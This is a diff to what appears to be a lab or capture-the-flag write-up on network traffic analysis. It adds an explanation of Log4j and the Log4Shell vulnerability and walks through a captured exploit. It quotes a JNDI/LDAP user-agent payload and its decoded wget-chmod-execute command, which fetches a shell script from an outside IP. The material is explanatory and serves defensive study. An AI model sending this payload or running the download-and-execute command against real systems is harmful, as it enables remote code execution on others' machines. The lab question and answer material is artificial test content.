@@ -592,7 +592,14 @@ We actually saw a Log4j related packet in this packet capture while identifying 
 ```
 user-agent: ${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
 ```
-However, for these next two questions, we need to switch to a different packet capture.
+However, for these next two questions, we need to switch to a different packet capture. Before we dive in though, let's briefly go over what **Log4j** is. From [Apache's own website](https://logging.apache.org/log4j/2.x/index.html): "Apache Log4j is a versatile, industrial-grade Java logging framework composed of an API, its implementation, and components to assist the deployment for various use cases." In other words, Java applications use it to record things like errors, warnings, authentication events, application activity, and debugging information. The user-agent above is actually a Log4j exploitation attempt called **Log4Shell**, though you'll often hear them used interchangeably in the security industry. So, Log4j is the actual name of the logging library, while Log4Shell is the name of the critical vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)) that affects certain versions of Log4j 2.
+
+This vulnerability was such a big deal because it was a zero-day and allowed for **Remote Code Execution (RCE)**. The vulnerable versions of Log4j supported a feature where specifically formatted strings in logged data could trigger lookups. The attacker could send strings, like in the sample above, via the user-agent header, username, HTTP parameter, etc. Log4j would then interpret it as a command. Let's look at the sample above and see what it might do. `${jndi:...}` tells Log4j to parse this as a command. `ldap://45.137.21.9:1389` tells the device to that IP over LDAP. There's a base64 command that decodes to:
+```
+wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
+```
+
+This is actually three separate commands. This means download the `lh.sh` script from `http://62.210.130.250`. Then, `chmod +x lh.sh` sets the new script as executable. Finally. it executes it `./lh.sh`. This vulnerability was such a big deal because Log4j was deeply embedded in the Java ecosystem. It could be part of an application in such a way that the owners wouldn't even know they're using it.
 
 ### Question 4 - Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)
 
